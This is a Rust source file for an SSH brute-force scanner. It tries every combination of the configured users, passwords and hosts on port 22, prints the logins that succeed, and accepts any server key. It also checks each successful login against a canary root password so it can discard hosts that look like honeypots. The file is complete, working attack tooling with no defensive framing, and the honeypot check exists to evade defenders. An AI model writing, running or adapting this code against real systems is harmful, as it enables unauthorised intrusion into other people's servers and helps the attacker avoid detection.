extern crate thrussh;
extern crate thrussh_keys;
extern crate futures;
extern crate tokio;
extern crate tokio_stream;
extern crate indicatif;
use crate::args;
use std::string::String;
use thrussh::*;
use thrussh::client::*;
use thrussh_keys::*;
use std::sync::Arc;
use indicatif::{ProgressBar, ProgressStyle};
use tokio::runtime::Runtime;

struct Client {
}
const CANARY_USER: &str = "root";
const CANARY_PASS: &str = "definitelynotarealpasswordthereisnowaythiswillmatch";

impl client::Handler for Client {
   type Error = anyhow::Error;
   type FutureUnit = futures::future::Ready<Result<(Self, client::Session), anyhow::Error>>;
   type FutureBool = futures::future::Ready<Result<(Self, bool), anyhow::Error>>;

   fn finished_bool(self, b: bool) -> Self::FutureBool {
       futures::future::ready(Ok((self, b)))
   }
   fn finished(self, session: client::Session) -> Self::FutureUnit {
       futures::future::ready(Ok((self, session)))
   }
   fn check_server_key(self, _server_public_key: &key::PublicKey) -> Self::FutureBool {
       self.finished_bool(true)
   }
   fn channel_open_confirmation(self, _channel: ChannelId, _max_packet_size: u32, _window_size: u32, session: client::Session) -> Self::FutureUnit {
       self.finished(session)
   }
   fn data(self, _channel: ChannelId, _data: &[u8], session: client::Session) -> Self::FutureUnit {
       self.finished(session)
   }
}

async fn test_honeypot(host:String) -> Result<bool, &'static str> {
    let config: Arc<Config> = Arc::new(thrussh::client::Config::default());
    let client: Client = Client{};
    let session = thrussh::client::connect(config, format!("{}:22", host), client).await;
    match session {
	Ok(mut s) => {
	    let auth = s.authenticate_password(CANARY_USER, CANARY_PASS).await;
	    match auth {
		Ok(a) => {
		    return Ok(a);
		},
		Err(_e) => return Err("Not a honeypot, login failed"),
	    }
	},
	Err(_e) => Err("Could not connect to host, not a honeypot"),
    }
}

async fn try_login(pb:ProgressBar, host:String, user:String, pass:String) -> Result<bool, &'static str> {
    let config: Arc<Config> = Arc::new(thrussh::client::Config::default());
    let client: Client = Client{};
    let session = thrussh::client::connect(config, format!("{}:22", host), client).await;
    pb.inc(1);
    let message = format!("{} {} {}", host, user, pass);
    pb.set_message(&message);
    match session {
	Ok(mut s) => {
	    let auth = s.authenticate_password(user, pass).await;
	    match auth {
		Ok(true) => {
		    let hp_test = test_honeypot(host).await;
		    match hp_test {
			Ok(true) => {
			    return Err("Host is a honeypot");
			},
			Ok(false) => {
			    pb.println(message);
			    return Ok(true);
			},
			Err(e) => return Err(e),
		    }
		},
		Ok(false) => {
		    return Err("Login failed")
		}
		Err(_e) => Err("Could not auth")
	    }
	},
	Err(_e) => Err("Could not connect to host"),
    }
}

pub fn start(config:args::Config) -> Result<bool, &'static str> {

    let items: u64 = config.users.len() as u64 * config.passwords.len() as u64 * config.hosts.len() as u64;
    let rt = Runtime::new().unwrap();
    let pb = ProgressBar::new(items);
    pb.set_style(ProgressStyle::default_bar()
		 .template("{spinner:.green} {elapsed_precise} {msg} [{wide_bar}] [{pos}/{len}] ({eta}@{per_sec})")
		 .progress_chars("=> "));

    
    let mut tasks: Vec<_> = Vec::new();

    for host in config.hosts.iter() {
	for user in config.users.iter() {
	    for pass in config.passwords.iter() {
		let pb = pb.clone();
		let host = host.clone();
		let user = user.clone();
		let pass = pass.clone();
		tasks.push(try_login(pb, host, user, pass));
	    }
        }
    }
    rt.block_on(futures::future::join_all(tasks));
    pb.finish_with_message("scan complete");
    return Ok(true);
}
